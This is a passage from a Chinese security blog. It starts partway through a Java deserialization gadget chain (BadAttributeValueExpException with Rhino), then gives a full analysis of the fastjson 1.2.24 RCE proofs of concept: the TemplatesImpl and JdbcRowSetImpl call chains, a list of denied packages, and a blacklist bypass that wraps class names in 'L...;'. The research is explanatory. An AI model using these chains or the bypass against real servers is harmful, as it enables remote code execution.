class="number">0</span>, <span class="number">1</span>);</span><br><span class="line">        Field getter = slot.getClass().getDeclaredField(<span class="string">"getter"</span>);</span><br><span class="line">        getter.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">        Class&lt;?&gt; memberboxClass = Class.forName(<span class="string">"org.mozilla.javascript.MemberBox"</span>);</span><br><span class="line">        Constructor&lt;?&gt; memberboxClassConstructor = memberboxClass.getDeclaredConstructor(Method.class);</span><br><span class="line">        memberboxClassConstructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        Object memberboxes = memberboxClassConstructor.newInstance(enterMethod);</span><br><span class="line">        getter.set(slot, memberboxes);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//构造 BadAttributeValueExpException 对象 b</span></span><br><span class="line">    <span class="comment">//设置 b 的成员变量 val 为 NativeError 对象 a</span></span><br><span class="line">    BadAttributeValueExpException badAttributeValueExpException = <span class="keyword">new</span> BadAttributeValueExpException(<span class="keyword">null</span>); </span><br><span class="line">    &#123;</span><br><span class="line">        Field valField = badAttributeValueExpException.getClass().getDeclaredField(<span class="string">"val"</span>);</span><br><span class="line">        valField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        valField.set(badAttributeValueExpException, nativeError);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> badAttributeValueExpException;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>调用栈：</p>
<p><img src="https://yaowendao.cn-bj.ufileos.com/47-call-stack.png" alt="call-stack"></p>
<h2 id="四、心得"><a href="#四、心得" class="headerlink" title="四、心得"></a>四、心得</h2><p><strong>1、</strong> 有 <code>BadAttributeValueExpException</code> 作为反序列化的入口，<code>toString()</code> 也成为了 <code>readObject()</code> 之外的另一个反序列化攻击触发点。</p>
<p><strong>2、</strong> 反射功能，很好很强大。</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://www.yaowendao.com/2017/12/11/fastjson反序列化漏洞POC分析/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="香依香偎">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/image/0.jpeg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="闻道解惑">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2017/12/11/fastjson反序列化漏洞POC分析/" itemprop="url">fastjson 反序列化漏洞POC分析</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-12-11T00:00:00+08:00">
                2017-12-11
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>来源：<a href="https://mp.weixin.qq.com/s/0a5krhX-V_yCkz-zDN5kGg" target="_blank" rel="noopener">香依香偎@闻道解惑</a></p>
<p><code>fastjson</code> 是阿里巴巴开源的，使用 <code>Java</code> 语言编写的 <code>JSON</code> 解析库，项目地址是 <a href="https://github.com/alibaba/fastjson" target="_blank" rel="noopener">https://github.com/alibaba/fastjson</a>，以速度快、性能高著称，使用范围非常广。</p>
<p>在2017年3月15日，<code>Fastjson</code> 官方主动爆出 <code>Fastjson</code> 在 1.2.24 及之前版本存在远程代码执行高危安全漏洞。本文对这个漏洞的POC进行分析。</p>
<h2 id="零、Fastjson-反序列化的特点"><a href="#零、Fastjson-反序列化的特点" class="headerlink" title="零、Fastjson 反序列化的特点"></a>零、<code>Fastjson</code> 反序列化的特点</h2><p>先创建一个实体类 <code>User</code>，其中包括：</p>
<pre><code>•    public  元素 name
•    private 元素 age   和它的 setter 函数
•    private 元素 prop  和它的 getter 函数
•    private 元素 grade 和它的 getter 函数
</code></pre><p><img src="https://yaowendao.cn-bj.ufileos.com/01-User.png" alt="01-User.png"></p>
<p>接下来使用 <code>JSON.parseObject()</code>，用指定类型的方式将这个类反序列化出来。</p>
<p><img src="https://yaowendao.cn-bj.ufileos.com/01-App.png" alt="01-App.png"></p>
<p>运行结果是：</p>
<p><img src="https://yaowendao.cn-bj.ufileos.com/01-result.png" alt="01-result.png"></p>
<p>从结果上看，我们可以得出以下结论：</p>
<pre><code>•    User 对象的无参构造函数被调用
•    public String name 被成功的反序列化
•    private int age 被成功的反序列化，它的 setter 函数被调用
•    private Properties prop 被成功的反序列化，它的 getter 函数被调用
•    private String grade 没有被反序列化，仍然是默认值 null，getter 函数也没有被调用
</code></pre><p>前三点都自然，奇怪的是后两点。<code>prop</code> 和 <code>grade</code> 同样是 <code>private</code> 类型，同样提供了 <code>getter</code> 函数没有提供 <code>setter</code> 函数，为什么 <code>prop</code> 可以通过 <code>getter</code> 函数来反序列化，而 <code>grade</code> 却没有？</p>
<p>这涉及到 <code>fastjson</code> 的一个特殊处理。对于只有 <code>getter</code> 函数，没有 <code>setter</code> 函数的 <code>private</code> 元素，<code>fastjson</code> 会按如下条件判断反序列化的时候是否调用其 <code>getter</code> 函数。</p>
<pre><code>•    函数名称大于等于 4
•    非静态函数
•    函数名称以get起始，且第四个字符为大写字母
•    函数没有入参
•    函数的返回类型满足如下之一
◦    继承自Collection
◦    继承自Map
◦    是AtomicBoolean
◦    是AtomicInteger
◦    是AtomicLong
</code></pre><p><img src="https://yaowendao.cn-bj.ufileos.com/01-JavaBeanInfo.png" alt="01-JavaBeanInfo"></p>
<p>回到前面的问题。<code>prop</code> 的 <code>getter</code> 函数 <code>getProp()</code> 满足上面的条件，它的返回类型 <code>Properties</code> 继承自 <code>Map</code> ，因此可以成功的被调用。而 <code>grade</code> 的 <code>getter</code> 函数 <code>getGrade()</code> 的返回类型 <code>String</code> 不满足返回类型的那个条件，因此没有被调用，<code>grade</code> 也无法被赋值。</p>
<p>那么，在反序列化的时候，向 <code>grade</code> 这样无法通过 <code>setter</code> 或 <code>getter</code> 函数进行赋值的 <code>private</code> 元素，有什么方法可以赋值呢？有。就是使用 <code>FEATURE.SupportNonPublicField</code>。</p>
<p>在 <code>JSON.parseObject()</code> 中使用 <code>fastjson</code> 的标签 <code>FEATURE.SupportNonPublicField</code>：</p>
<p><img src="https://yaowendao.cn-bj.ufileos.com/02-App.png" alt="02-App"></p>
<p>执行结果是：</p>
<p><img src="https://yaowendao.cn-bj.ufileos.com/02-result.png" alt="02-result"></p>
<p><code>grade</code> 已经成功被反序列化，此时 <code>grade</code> 的 <code>getter</code> 函数 <code>getGrade()</code> 并没有被调用。</p>
<p><code>FEATURE.SupportNonPublicField</code> 从 <code>fastjson</code> 的 <code>1.2.22</code> 版本开始引入。</p>
<p>还有个疑问：上面的 <code>App.java</code> 中，<code>json string</code> 中使用 <code>@type</code> 标签指定了反序列化的目标类型为 <code>com.xiang.fastjson.poc.User</code>，在调用 <code>JSON.parseObject()</code> 时也指定了目标类型是 <code>User.class</code>。那如果这两个类型不一致，会发生什么？</p>
<p>需要说明的是，只要 <code>JSON.parseObject()</code> 的第二个参数中指定的类，与 <code>json string</code> 中 <code>@type</code> 指定的类之间存在继承或转换关系，那么这个反序列化就会成功执行。比如把 <code>JSON.parseObject()</code> 的第二个参数设为 <code>Object.class</code>（也就是所有类的基类），那么反序列化就不会因为类型不匹配而失败。如果把第二个参数设为 <code>String.class</code>，那么所有支持 <code>toString()</code> 方法的类同样可以序列化成功。</p>
<p>但是如果两个类之间没有关联关系，那么反序列化的时候，是会直接返回错误拒绝反序列化，还是将对象反序列化完成再进行类型转换呢？</p>
<p>这个答案是：不确定。比如，我们修改 <code>App.java</code>，将 <code>JSON.parseObject()</code> 的第二个参数换成 <code>Integer.class</code>，<code>json string</code> 中仍然保持 <code>com.xiang.fastjson.poc.User</code>。</p>
<p><img src="https://yaowendao.cn-bj.ufileos.com/03-App.png" alt="03-App"></p>
<p>执行结果是：</p>
<p><img src="https://yaowendao.cn-bj.ufileos.com/03-result.png" alt="03-result"></p>
<p>从结果看，<code>fastjson</code> 先按照 <code>json string</code> 中的 <code>@type</code> 将对象反序列化出来，然后再转换为 <code>JSON.parseObject()</code> 中指定的目标类型。即便两个类型不一致，<code>json string</code> 指定的对象对应的 <code>getter</code> 和 <code>setter</code> 函数也一样会被调用。</p>
<p>再换一下，把 <code>JSON.parseObject()</code> 的第二个参数换成 <code>ASMUtils.class</code>。</p>
<p><img src="https://yaowendao.cn-bj.ufileos.com/04-App.png" alt="04-App"></p>
<p>执行结果是：</p>
<p><img src="https://yaowendao.cn-bj.ufileos.com/04-result.png" alt="04-result"></p>
<p>这一次的结果上，<code>fastjson</code> 却首先检查了两个类型是否匹配，不匹配直接抛出异常，没有调用各个字段的方法进行反序列化操作。</p>
<p><code>fastjson</code> 内置了一些常用类的反序列化处理类，这些常用类的列表在 <code>ParseConfig.java</code> 中可以看到。</p>
<p><img src="https://yaowendao.cn-bj.ufileos.com/04-deserializemap.png" alt="04-deserializemap"></p>
<p>其中有一些处理类中（比如<code>Integer</code>、<code>BigInteger</code>等）没有检查类型是否匹配，就直接进行反序列化处理；有一些没有进行检查，但是反序列化过程会因为语法错误而失败。而对于大多数不属于常用类的情况，<code>fastjson</code> 是会进行检查不同类型之间的关联关系的（如上面的<code>ASMUtils</code>）。</p>
<p>好吧，这一部分太晕了。有没有更简单一些的用法，不用考虑这些匹配原则？有，就是 <code>JSON.parse()</code>。</p>
<p><img src="https://yaowendao.cn-bj.ufileos.com/05-App.png" alt="05-App"></p>
<p>执行结果是：</p>
<p><img src="https://yaowendao.cn-bj.ufileos.com/05-result.png" alt="05-result"></p>
<p>同样也支持 <code>Feature.SupportNonPublicField</code> 设置。</p>
<p><img src="https://yaowendao.cn-bj.ufileos.com/06-App.png" alt="06-App"></p>
<p>执行结果是：</p>
<p><img src="https://yaowendao.cn-bj.ufileos.com/06-result.png" alt="06-result"></p>
<p>可以看到，<code>JSON.parse()</code>，完全是按照 <code>json string</code> 中指定的类进行反序列化，不用考虑指定目标类的情况，因此可能是更广泛的用法吧。不过少了一次类型检查，也会引入更多的安全风险。</p>
<h2 id="一、TemplatesImpl-POC分析"><a href="#一、TemplatesImpl-POC分析" class="headerlink" title="一、TemplatesImpl POC分析"></a>一、TemplatesImpl POC分析</h2><p>首先是 <code>TemplatesImpl</code> 的 POC，来自于 <a href="http://xxlegend.com/2017/04/29/title-%20fastjson%20远程反序列化poc的构造和分析/" target="_blank" rel="noopener">廖神</a>。</p>
<p>这个 POC 的入口点在 <code>TemplatesImpl</code> 类中 <code>getOutputPerpeties()</code> 函数。由于 <code>TemplatesImpl</code> 的 <code>private</code> 元素 <code>_outputProperties</code> 只有 <code>getter</code> 没有 <code>setter</code> ，同时其 <code>getter</code> 函数的返回类型 <code>Properties</code> 又继承自 <code>Map</code>，因此这个 <code>getter</code> 函数 <code>getOutputProperties()</code> 满足前面说的调用条件，可以被 <code>fastjson</code> 反序列化 <code>TemplatesImpl</code> 时调用到 。POC 的调用链是：</p>
<ul>
<li>getOutputProperties() <ul>
<li>-&gt; newTransformer() <ul>
<li>-&gt; getTransletInstance() <ul>
<li>-&gt; defineTransletClasses()`</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<p><img src="https://yaowendao.cn-bj.ufileos.com/09-templatesimpl-01.png" alt="09-templatesimpl-01.png"></p>
<p><img src="https://yaowendao.cn-bj.ufileos.com/09-templatesimpl-02.png" alt="09-templatesimpl-02.png"></p>
<p><img src="https://yaowendao.cn-bj.ufileos.com/09-templatesimpl-03.png" alt="09-templatesimpl-03.png"></p>
<p><img src="https://yaowendao.cn-bj.ufileos.com/09-templatesimpl-04.png" alt="09-templatesimpl-04.png"></p>
<p>POC 代码如下：</p>
<p><img src="https://yaowendao.cn-bj.ufileos.com/07-exploit.png" alt="07-exploit.png"></p>
<p><img src="https://yaowendao.cn-bj.ufileos.com/07-poc.png" alt="07-poc.png"></p>
<p>执行之后成功弹出计算器：</p>
<p><img src="https://yaowendao.cn-bj.ufileos.com/07-result.png" alt="07-result.png"></p>
<p>上面的POC中，<code>Exploit</code> 类继承自 <code>AbstractTranslet</code>。如果不让 <code>Exploit</code> 类继承也可以，只要在 json str 中，<code>_outputProperties</code> 之前增加 <code>_transletIndex</code> 和 <code>_auxClasses</code> 的设置就好了。</p>
<p><img src="https://yaowendao.cn-bj.ufileos.com/08-exploit.png" alt="08-exploit.png"></p>
<p><img src="https://yaowendao.cn-bj.ufileos.com/08-poc.png" alt="08-poc.png"></p>
<p>执行之后同样弹出计算器：</p>
<p><img src="https://yaowendao.cn-bj.ufileos.com/08-result.png" alt="08-result.png"></p>
<p><code>TemplatesImpl</code> 的 POC，在利用的时候有几个限制：</p>
<ol>
<li>由于 POC 中关键元素 <code>_bytecode</code> 没有对应的 <code>public</code> 的 <code>getter</code> 和 <code>setter</code> 函数，因此需要服务器上解析 json 的时候，不管是使用 <code>JSON.parse()</code> 还是使用 <code>JSON.parseObject()</code>，都需要设置 <code>Feature.SupportNonPublicField</code> 。</li>
<li><code>Feature.SupportNonPublicField</code> 是在 1.2.22 版本引入，而这个漏洞在 1.2.25 版本就被封堵。这就要求目的服务器上的 <code>fastjson</code> 版本必须在 1.2.22 到 1.2.24 之间。</li>
<li>如果目的服务器使用的是 <code>JSON.parseObject()</code>，那么第二个参数必须是和 <code>TemplatesImpl</code> 不冲突的类，比如 <code>Object.class</code>，<code>String.class</code>，<code>Integer.class</code> 等。</li>
</ol>
<h2 id="二、JdbcRowSetImpl-POC分析"><a href="#二、JdbcRowSetImpl-POC分析" class="headerlink" title="二、JdbcRowSetImpl POC分析"></a>二、JdbcRowSetImpl POC分析</h2><p><code>JdbcRowSetImpl</code> 的 POC 同样来自 <a href="http://xxlegend.com/2017/12/06/基于JdbcRowSetImpl的Fastjson%20RCE%20PoC构造与分析/" target="_blank" rel="noopener">廖神</a>。</p>
<p><code>JdbcRowSetImpl</code> 的调用入口在 <code>setAutoCommit()</code> ，调用链很短：</p>
<ul>
<li>setAutoCommit() <ul>
<li>-&gt; connect() <ul>
<li>-&gt; InitialContext.lookup()</li>
</ul>
</li>
</ul>
</li>
</ul>
<p><img src="https://yaowendao.cn-bj.ufileos.com/10-JdbcRowSetImpl-01.png" alt="10-JdbcRowSetImpl-01.png"></p>
<p><img src="https://yaowendao.cn-bj.ufileos.com/10-JdbcRowSetImpl-02.png" alt="10-JdbcRowSetImpl-02.png"></p>
<p>需要设置的属性只有 <code>dataSourceName</code> 和 <code>autoCommit</code> 两个。由于它们的 <code>setter</code> 函数 <code>setDataSourceName()</code> 和 <code>setAutoCommit()</code> 都是 <code>public</code> 类型，因此这里 <em>不需要设置</em> <code>SupportNonPublicField</code> 属性 ，可以直接触发。</p>
<p>POC代码为</p>
<p><img src="https://yaowendao.cn-bj.ufileos.com/11-JdbcRowSetImpl-Poc.png" alt="11-JdbcRowSetImpl-Poc.png"></p>
<p>搭建好 RMI 的环境之后，执行 POC ，成功弹出计算器。</p>
<p><img src="https://yaowendao.cn-bj.ufileos.com/11-JdbcRowSetImpl-result.png" alt="11-JdbcRowSetImpl-result.png"></p>
<p><code>JdbcRowSetImpl</code> 的 POC，使用限制为：<br>    1    <code>fastjson</code> 的版本范围为 <code>1.2.24</code> 及以下的所有版本。<br>    2    如果目的服务器使用的是 <code>JSON.parseObject()</code>，那么第二个参数必须是和 <code>JdbcRowSetImpl</code> 不冲突的类，比如 <code>Object.class</code>，<code>String.class</code>，<code>Integer.class</code> 等。</p>
<h2 id="三、fastjson-的修复"><a href="#三、fastjson-的修复" class="headerlink" title="三、fastjson 的修复"></a>三、fastjson 的修复</h2><p>反序列化漏洞的修补，通常都是通过白名单或黑名单的形式，禁止具有恶意功能的类进行反序列化。<code>fastjson</code> 使用的是黑名单的方式，具体而言就是从 1.2.25 版本开始，<code>fastjson</code> 增加了两个处理：</p>
<ol>
<li><code>autotype</code> 功能默认关闭，同时提供手动 <code>enable_autotype</code> 的设置。</li>
<li>默认开启了黑名单，危险类所在的包不允许进行反序列化。</li>
</ol>
<p>我们将 <code>fastjson</code> 升级到最新的 1.2.41 版本，再执行上面 <code>JdbcRowSetImpl</code> 的 POC，结果是直接抛了异常：</p>
<p><img src="https://yaowendao.cn-bj.ufileos.com/12-1.2.41-autoType-close.ong.png" alt="12-1.2.41-autoType-close.ong.png"></p>
<p>查看抛异常的地方，</p>
<p><img src="https://yaowendao.cn-bj.ufileos.com/12-1.2.41-checkautotype.png" alt="12-1.2.41-checkautotype.png"></p>
<p>查看denyList的定义，可以找到目前定义的黑名单列表。</p>
<p><img src="https://yaowendao.cn-bj.ufileos.com/12-denyList.png" alt="12-denyList.png"></p>
<pre><code>•    bsh
•    com.mchange
•    com.sun.
•    java.lang.Thread
•    java.net.Socket
•    java.rmi
•    javax.xml
•    org.apache.bcel
•    org.apache.commons.beanutils
•    org.apache.commons.collections.Transformer
•    org.apache.commons.collections.functors
•    org.apache.commons.collections4.comparators
•    org.apache.commons.fileupload
•    org.apache.myfaces.context.servlet
•    org.apache.tomcat
•    org.apache.wicket.util
•    org.apache.xalan
•    org.codehaus.groovy.runtime
•    org.hibernate
•    org.jboss
•    org.mozilla.javascript
•    org.python.core
•    org.springframework
</code></pre><p><code>com.sum.rowset.JdbcRowSetImpl</code> 正好符合其中的 <code>com.sun.</code> 这个黑名单前缀，因此被屏蔽。</p>
<h2 id="四、denyList-黑名单的绕过"><a href="#四、denyList-黑名单的绕过" class="headerlink" title="四、denyList 黑名单的绕过"></a>四、denyList 黑名单的绕过</h2><p><code>fastjson</code> 修补之后默认关闭了 <code>autoType</code> 功能，同时开启了黑名单。</p>
<p>但是这个黑名单功能的实现还是有问题的。在 <code>autoType</code> 功能打开的情况下（总有些偷懒的开发人员会这么干的），我们可以绕过这个黑名单的限制。</p>
<p>首先，我们通过命令行参数 <code>-Dfastjson.parser.autoTypeSupport=true</code> 的方式开启 <code>autoType</code> 功能，执行一下 <code>JdbcRowSetImplPoc</code>。</p>
<p><img src="https://yaowendao.cn-bj.ufileos.com/13-open-autotype.png" alt="13-open-autotype.png"></p>
<p>在 ParserConfig 的 880 行抛出异常。查看代码，这次是被黑名单 denyList 给拦截了。</p>
<p><img src="https://yaowendao.cn-bj.ufileos.com/13-denyList-block.png" alt="13-denyList-block.png"></p>
<p>继续往下看，在 926 行调用了 <code>TypeUtils.loadClass()</code> 来反序列化生成类。</p>
<p><img src="https://yaowendao.cn-bj.ufileos.com/14-TypeUtils-loadClass.png" alt="14-TypeUtils-loadClass.png"></p>
<p>点进去看看，在 <code>TypeUtils</code> 的 1143 行，对于类名由 <code>L</code> 和 <code>;</code> 包装的情况下，这里会直接去掉类名前后的 <code>L</code> 和 <code>;</code>，然后再 <code>loadClass()</code> ！</p>
<p><img src="https://yaowendao.cn-bj.ufileos.com/14-TypeUtils-loadClass-L.png" alt="14-TypeUtils-loadClass-L.png"></p>
<p>这就意味着，我们只需要将 json string 中的类名前后增加 <code>L</code> 和 <code>;</code>，也就是把 POC 中 <code>@type</code> 的值从 <code>com.sun.rowset.JdbcRowSetImpl</code> 改成 <code>Lcom.sun.rowset.JdbcRowSetImpl;</code> ，就能绕过黑名单的检查，同时也能完成 <code>JdbcRowSetImpl</code> 的反序列化！</p>
<p><img src="https://yaowendao.cn-bj.ufileos.com/15-Lcom.sun.rowset.JdbcRowSetImpl-.png" alt="15-Lcom.sun.rowset.JdbcRowSetImpl-.png"></p>
<p>用命令行参数 <code>-Dfastjson.parser.autoTypeSupport=true</code> 开启 <code>autoType</code> 功能，再执行一下新的 <code>JdbcRowSetImplPoc</code>。</p>
<p><img src="https://yaowendao.cn-bj.ufileos.com/15-result.png" alt="15-result.png"></p>
<p>成功！</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
  </section>

  
  <nav class="pagination">
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right"></i></a>
  </nav>



          </div>
          


          

        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      

      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <img class="site-author-image" itemprop="image"
                src="/image/0.jpeg"
                alt="香依香偎" />
            
              <p class="site-author-name" itemprop="name">香依香偎</p>
              <p class="site-description motion-element" itemprop="description">闻道解惑, 香依香偎</p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives">
              
                  <span class="site-state-item-count">11</span>
                  <span class="site-state-item-name">日志</span>
                </a>
              </div>
            

            

            
              
              
              <div class="site-state-item site-state-tags">
                <a href="/tags/index.html">
                  <span class="site-state-item-count">38</span>
                  <span class="site-state-item-name">标签</span>
                </a>
              </div>
            

          </nav>

          
            <div class="feed-link motion-element">
              <a href="/atom.xml" rel="alternate">
                <i class="fa fa-rss"></i>
                RSS
              </a>
            </div>
          

          
            <div class="links-of-author motion-element">
                
                  <span class="links-of-author-item">
                    <a href="https://github.com/yaojieno1" target="_blank" title="GitHub">
                      
                        <i class="fa fa-fw fa-github"></i>GitHub</a>
                  </span>
                
                  <span class="links-of-author-item">
                    <a href="mailto:yaojieno1@hotmail.com" target="_blank" title="E-Mail">
                      
                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
                  </span>
                
                  <span class="links-of-author-item">
                    <a href="https://weibo.com/gigabyte" target="_blank" title="Weibo">
                      
                        <i class="fa fa-fw fa-weibo"></i>Weibo</a>
                  </span>
                
            </div>
          

          
          

          
          

          

        </div>
      </section>

      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">香依香偎</span>

  
</div>


  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>



  <span class="post-meta-divider">|</span>



  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Mist</a> v5.1.4</div>




        







        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  












  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>



  
  

  

  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>



  


  




	





  





  












  





  

  

  

  
  

  

  

  

</body>
</html>
